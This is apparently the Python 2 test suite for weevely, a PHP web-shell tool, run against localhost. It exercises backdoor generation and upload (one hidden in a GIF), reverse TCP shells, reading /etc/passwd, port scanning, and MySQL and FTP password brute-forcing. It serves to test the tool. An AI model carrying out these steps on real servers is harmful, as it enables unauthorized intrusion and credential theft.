from commands import getstatusoutput as run
from os import system as run_bg, getenv, remove
from re import search, DOTALL
from sys import argv
import types
from commands import getstatusoutput

class TestException(Exception):
    pass

host = 'http://localhost'
url = '%s/we.php' % host
pwd = 'asdasd'
urlpwd = '%s %s' % (url, pwd)
writable_dir = 'writable'
http_proxy = "http://localhost:8080"
bd_tcp_port = 9090
mysql_user = 'root'
mysql_pwd = 'root'
ftp_user = 'weev-test'
ftp_pwd = 'weev-test'


home = getenv("HOME")
if home[-1] == '/': home = home[:-1]
readable_file_in_home_directory = "%s/.bash_history" % home



scripts = {
           
           '/tmp/tempscript' : """# comment
:shell.php 'print("OK test");'
""",

            '/tmp/proxyscript' : """:set shell.php proxy='%s'
:shell.php 'print("OK test");'
:system.info client_ip
""" % (http_proxy),

            '/tmp/proxybrokescript' : """:set shell.php proxy='%s'
:shell.php 'print("OK test");'
""" % (http_proxy[:-1]),

            '/tmp/enumlist' : """/etc/motd
/etc/dasadas
/lkj/kjhkjlh
/boot/lkjlsdaassad
/etc/passwd
""" ,


            '/tmp/wordlist' : """pass
pass1
pass2
admin
asdasd
thisiswrongpassword
kjdsa
#comment?
%s
asd
%s
""" % (ftp_pwd, mysql_pwd),

            '/tmp/image.gif' : 'http://upload.wikimedia.org/wikipedia/commons/4/4b/Empty.gif'
           
           }


class TG(list):
    
    def __init__(self, name, description, TCs):
        
        self.name = name
        self.description = description
        
        list.__init__(self)
        
        self.extend(TCs)

        
    def test(self):
        
        print '\n[%s] %s\n' % (self.name, self.description)
        
        for tc in self:
            tc.test()

class TC:
    def __init__(self, params, expected_output, expected_status = None, negate=False, printout=False, background=False):
        
        if isinstance(expected_output, types.ListType):
            self.expected_output = expected_output
        elif isinstance (expected_output, types.StringTypes):
            self.expected_output = [ expected_output ]
        else:
            print "[!] Error declaring TC expected output"

        self.params = params
        
        self.status = expected_status
        self.negate = negate
        self.printout = printout
        self.background = background

    def outp_format(self, out):
        
        return ' \n===============================\n%s\n===============================\n' % out




    def test(self):
            
        result = 'KO'
            
        if self.background:
            cmd_string = './weevely.py %s &' % (' '.join(self.params))
            if not self.printout:
                cmd_string = '(%s) > /dev/null' % cmd_string
            run_bg(cmd_string)
            result = 'BG'
        else:
            cmd_string = './weevely.py %s' % (' '.join(self.params))
            status, output = run(cmd_string)
            for expected in self.expected_output:
                if self.negate != bool(search('.*%s.*' % expected, output, flags=DOTALL)):
                    # Only one test passed in enough
                    
                    if self.negate:
                        result = "OK NOT [ '%s' ]" % "', '".join(self.expected_output)
                    else:
                        result = "OK [ '%s' ]" % (expected)
                    
                    break

        print '[+] %s .. %s' % (cmd_string, result) 

        if result == 'KO':
            raise TestException('Test failed. Expected output: \'%s\'\n %s' % ("', '".join(self.expected_output), self.outp_format(output)))
        
        if self.printout:
            print self.outp_format(output)
           
        


TS = [
      
      TG('show', 'Test "show"',
        [
        TC([ 'show',  'generate.asd' ],'Error'),                # show with existant mod
        TC([ 'show', 'sql.dump' ],'Error', negate=True),        # show good mod
        TC([ 'show', ':sql.dump' ],'Error', negate=True),       # show good :mod
        TC([ urlpwd, ':show sql.dump' ],'Error', negate=True),   # show good mod cmdline
        TC([ urlpwd, ':show :sql.dump' ],'Error', negate=True),   # show good :mod cmdline
        TC([ urlpwd[3:], ':show sql.dump' ],'Error', negate=True)   # show wrong url cmdline
        ]),
      
      TG('set', 'Test "set"',
        [
        TC([ urlpwd, ':set shell.sh cmd\=ls' ],'cmd=ls'),   # set variable with =
        TC([ urlpwd, ':set shell.sh ls' ],'cmd=ls'),   # set variable without =
        TC([ urlpwd, ':set shell.sh cmmd=ls' ],'invalid parameter'),   # set with good :mod cmdline
        TC([ urlpwd[3:], ':set shell.php verbose=True' ],'Error'),   # set with wrong url cmdline
        TC([ urlpwd, ':set sad.asd.ds verbose=True' ],'Error')   # set with non existant mod
        ]),
      

      TG('load', 'Test "load"',
        [
        TC([ urlpwd, ':load /tmp/tempscript' ],'\nOK test'),   # load working script
        TC([ urlpwd[:-1], ':load /tmp/tempscript' ],'\nOK test', negate=True),   # bad connection
        TC([ urlpwd, ':load /tmp/asd' ],'Error opening'),   # load unexistant script
        ]),
      
      
      TG('fname', 'Test "find.name"',
        [
        TC([ urlpwd, ':find.name ci %s .' % (writable_dir[2:-1].upper())], writable_dir),   # find if contains case insensitive
        TC([ urlpwd, ':find.name c %s' % (writable_dir[2:-1]) ], writable_dir),   # find if contains 
        TC([ urlpwd, ':find.name ei %s' % (writable_dir.upper()) ], writable_dir),   # find if equal case insensitive
        TC([ urlpwd, ':find.name e %s' % (writable_dir) ], writable_dir),   # find if equal 
        TC([ urlpwd, ':find.name ci ESOLV.CONF /etc/' ], 'resolv.conf'),   # find if contains case insensitive out of webroot
        ]),
      
      TG('fperms', 'Test "find.perms"',
        [
        TC([ urlpwd, ':find.perms first d w vector=ndee' ], 'Error, allowed values'),   # find with wrong vector
        TC([ urlpwd, ':find.perms first d w vector=find' ], writable_dir),   # find first writable dir
        TC([ urlpwd, ':find.perms any f x /sbin/ vector=find' ], 'insmod'),   # find executable directory in /sbin/
        TC([ urlpwd, ':find.perms any f r /etc/' ], 'passwd')   # find any readable files
        ]),      
      
      TG('proxy', 'Run background :net.proxy, set and use it to connect through',
        [
        TC([ urlpwd, ':net.proxy' ],'', background=True),   # start proxy in background
        TC([ urlpwd, ':load /tmp/proxyscript' ],'\nOK test'),   # execute some command through proxy
        TC([ urlpwd, ':load /tmp/proxybrokescript' ],'Connection refused'),   # set wrong proxy
        ]),      
      
      TG('backdoor', 'Open TCP backdoors and check',
        [
        TC([ urlpwd, ':backdoor.reverse_tcp localhost %i' % (bd_tcp_port) ], '', background=True),   # open reverse tcp shell in background
        TC([ urlpwd, ':backdoor.tcp %i' % bd_tcp_port ],'', background=True),   # connect with direct tcp 
        TC([ urlpwd, '"netstat -ap | grep %i"' % bd_tcp_port ],'.*\*:%i.*LISTEN.*localhost:%i.*ESTABLISHED.*localhost:%i.*ESTABLISHED.*' % (bd_tcp_port, bd_tcp_port, bd_tcp_port)) # check with netstat
        ]),

      TG('etc_passwd', 'Audit etc_passwd',
        [
        TC([ urlpwd, ':audit.etc_passwd vector=posix_getpwuid' ], ':daemon:/usr/sbin:'), 
        TC([ urlpwd, ':audit.etc_passwd filter=True vector=fileread' ], ':daemon:/usr/sbin:', negate=True) 
        ]),
      
      TG('read', 'Read remote file',
        [
        TC([ urlpwd, ':file.read /etc/passwd' ], ':daemon:/usr/sbin:'), 
        TC([ urlpwd, ':file.read rpath=/etc/passwd vector=base64' ], ':daemon:/usr/sbin:'), 
        TC([ urlpwd, ':file.read rpath=/etc/passwd vector=copy' ], ':daemon:/usr/sbin:'), 
        TC([ urlpwd, ':file.read rpath=/etc/passwd vector=symlink' ], ':daemon:/usr/sbin:'),
        TC([ urlpwd, ':file.read rpath=asdasd vector=symlink' ], 'File read failed')
        ]),
      
      TG('upload', 'Upload file',
        [
        TC([ urlpwd, ':file.upload /etc/motd %s/asd' % writable_dir ], 'File.*uploaded'),
        TC([ urlpwd, ':file.upload /etc/motd lkjh/lkj' ], 'creation failed'), 
        TC([ urlpwd, ':file.upload /etc/motd %s/asd' % writable_dir ], 'already exists.*File.*uploaded'),
        TC([ urlpwd, ':file.upload /etc/mot kjhkjlh' ], 'Open file \'/etc/mot\' failed'),
        ]),
      
      TG('enum', 'Enumerate files',
        [
        TC([ urlpwd, ':file.enum /tmp/enumlist' ], '/etc/motd.*/etc/passwd')
        ]),
      
      
      TG('scan', 'Network scanning',
        [
        TC([ urlpwd, ':net.scan localhost 12,30,40,70-90,2555' ], 'OPEN: 127.0.0.1:80'),
        TC([ urlpwd, ':net.scan www.google.it,localhost 12,30,40,70-90,2555' ], 'OPEN: .*:80.*OPEN: 127.0.0.1:80'),
        TC([ urlpwd, ':net.scan localhost 12,30' ], 'OPEN', negate=True)
        ]),
      
      TG('brutesql', 'SQL forcing',
        [
        TC([ urlpwd, ':bruteforce.sql mysql %s /tmp/wordlist' % (mysql_user) ], 'FOUND! \(%s:%s\)' % (mysql_user, mysql_pwd)),
        TC([ urlpwd, ':bruteforce.sql_users mysql /tmp/wordlist filtered.com' ], 'Check dbms availability'),
        TC([ urlpwd, ':bruteforce.sql mysql user /tmp/wordlist all nonexistant.host' ], 'Check dbms availability'),
        TC([ urlpwd, ':bruteforce.sql_users mysql /tmp/wordlist' ], 'FOUND! \(%s:%s\)' % (mysql_user, mysql_pwd)),
        TC([ urlpwd, ':bruteforce.sql postgres %s /tmp/wordlist' % (mysql_user) ], 'pg_connect not available'),
        TC([ urlpwd, ':bruteforce.sql mysql blabla /tmp/wordlist' ], 'Password of \'blabla\' not found'),
        
        ]),

      TG('bruteftp', 'FTP forcing',
        [
        TC([ urlpwd, ':bruteforce.ftp %s /tmp/wordlist' % (ftp_user) ], 'FOUND! \(%s:%s\)' % (ftp_user, ftp_pwd)),
        TC([ urlpwd, ':bruteforce.ftp_users /tmp/wordlist' ], 'FOUND! \(%s:%s\)' % (ftp_user, ftp_pwd)),
        TC([ urlpwd, ':bruteforce.ftp user /tmp/wordlist all filtered.com 22' ], 'service not available'),
        TC([ urlpwd, ':bruteforce.ftp user /tmp/wordlist all notexistant.host' ], 'service not available'),
        TC([ urlpwd, ':bruteforce.ftp %s /tmp/wordlista' % (mysql_user) ], 'No such file or directory'),
        TC([ urlpwd, ':bruteforce.ftp blabla /tmp/wordlist' ], 'Password of \'blabla\' not found'),
        ]),
      
      
      TG('sql', 'SQL',
        [

        TC([ urlpwd, ':sql.query mysql %s %s "SHOW DATABASES;" filtered.com' % (mysql_user, mysql_pwd) ], ['using default', 'check credential' ] ),
        TC([ urlpwd, ':sql.query mysql %s %s "SHOW DATABASES;" nonexistant.host' % (mysql_user, mysql_pwd) ], ['using default', 'check credential'] ),
        TC([ urlpwd, ':sql.query mysql %s %s "SHOW DATABASES;"' % (mysql_user, mysql_pwd) ], 'information_schema' ),
        TC([ urlpwd, ':sql.query mysql %s %s "WRONG_CMD"' % (mysql_user, mysql_pwd) ], 'check credential' ),        
        
        # Good with mysqldump and mysqlphpdump
        TC([ urlpwd, ':sql.dump mysql %s %s information_schema vector=mysqlphpdump' % (mysql_user, mysql_pwd) ], 'Saving \'.*\' dump' ),        
        TC([ urlpwd, ':sql.dump mysql %s %s information_schema vector=mysqldump' % (mysql_user, mysql_pwd) ], 'Saving \'.*\' dump' ),        
        
        # Bad with mysqlphpdump
        TC([ urlpwd, ':sql.dump mysql Asd asd information_schema vector=mysqlphpdump' ], ['using default', 'check credential' ] ), 
        TC([ urlpwd, ':sql.dump mysql %s %s baddb vector=mysqlphpdump' % (mysql_user, mysql_pwd) ], 'check credential' ),        
        
        #Bad with mysqldump
        TC([ urlpwd, ':sql.dump mysql %s %swrong information_schema vector=mysqldump' % (mysql_user, mysql_pwd) ], ['using default', 'check credential' ] ),        
        TC([ urlpwd, ':sql.dump mysql %s %s baddb vector=mysqldump' % (mysql_user, mysql_pwd) ], 'check credential'  ),        

        #Summary good
        TC([ urlpwd, ':sql.summary mysql %s %s information_schema' % (mysql_user, mysql_pwd) ], ['using default', 'check credential' ], negate=True ),
        TC([ urlpwd, ':sql.summary mysql %s %swrong information_schema filtered.com' % (mysql_user, mysql_pwd) ], ['using default', 'check credential' ] ),
        TC([ urlpwd, ':sql.summary mysql %swrong %s information_schema nonexistant.host' % (mysql_user, mysql_pwd) ], ['using default', 'check credential' ]  ),
        TC([ urlpwd, ':sql.summary mysql %s %s baddb' % (mysql_user, mysql_pwd) ], [ 'check credential' ]  ),

        ]),


      TG('generatephp', 'Generate and upload PHP backdoor',
        [
        TC([ 'generate password /tmp/testbd.php' ], 'Backdoor file \'/tmp/testbd.php\' created with password \'password\''),
        TC([ urlpwd, ':file.upload /tmp/testbd.php %s/testbd.php' % writable_dir ], 'File.*uploaded'),
        TC([ '%s/%s/testbd.php password' % (host, writable_dir), ':system.info os' ], 'Linux'),
        TC([ '%s/%s/testbd.php password' % (host, writable_dir), 'rm testbd.php' ], ''),
        TC([ '%s/%s/testbd.php password' % (host, writable_dir), ':system.info os' ], 'No remote backdoor found'),
        ]),
      
        TG('generateimg', 'Generate and upload backdoor embedded in image',
        [
        TC([ 'generate.img password /tmp/image.gif /tmp/generated-image/' ], 'created with password \'password\''),
        TC([ urlpwd, ':file.upload /tmp/generated-image/image.gif %s/image.gif' % (writable_dir) ], 'File.*uploaded'),
        TC([ urlpwd, ':file.upload /tmp/generated-image/.htaccess %s/.htaccess' % (writable_dir) ], 'File.*uploaded'),
        TC([ '%s/%s/image.gif password' % (host, writable_dir), ':system.info os' ], 'Linux'),
        TC([ urlpwd, 'rm %s/.htaccess' % (writable_dir)], ''),
        TC([ '%s/%s/image.gif password' % (host, writable_dir), ':system.info os' ], 'No remote backdoor found'),
        TC([ urlpwd, 'rm %s/image.gif' % (writable_dir)], ''),
        
        
        ]),

      
      # TODO: fare l'rm e cancellare tutti i file temporanei
      # Aggiungere il vettore sql da console (magari nn e installato il modulo per php)
      # Nell'help di generate non si capisce dove si mette la pwd
      
      ]       
    
def restore_enviroinment():
    for script_path in scripts:
        remove(script_path)
        
    print '[+] Deleted script files: "%s"' % '", "'.join(scripts.keys())
    
    
    
def initialize_enviroinment():
    
    for script_path in scripts:
        if scripts[script_path].startswith('http'):
            
            getstatusoutput('wget %s -O %s' % (scripts[script_path], script_path))
            
        else:
            fscript = file(script_path,'w')
            fscript.write(scripts[script_path])
            fscript.close()
        
    print '[+] Created script files: "%s"' % '", "'.join(scripts.keys())

       
def parse_testlist_parameters():
    
    tslist = []
    if len(argv) >= 2:
        for par in argv[1:]:
            if par.isdigit():
                tslist.append(int(par))
            else:
                tslist.append(par)
    else:
        print '[TESTSUITE] Specify tests or \'all\'. Available tests:\n[TESTSUITE] "%s"' % ('", "'.join([tg.name for tg in TS]))
    
    return tslist
       
       
def run_tests(tslist):
    try:
        i = 0
        for ts in TS:       
            if 'all' in tslist or ts.name in tslist or i in tslist:
                ts.test()
                
            i+=1
    except TestException, e:
        print '[!] %s' % str(e)
    
    
if __name__ == "__main__":
    
    tslist = parse_testlist_parameters()
    if tslist:
        initialize_enviroinment()
        run_tests(tslist)
        #restore_enviroinment()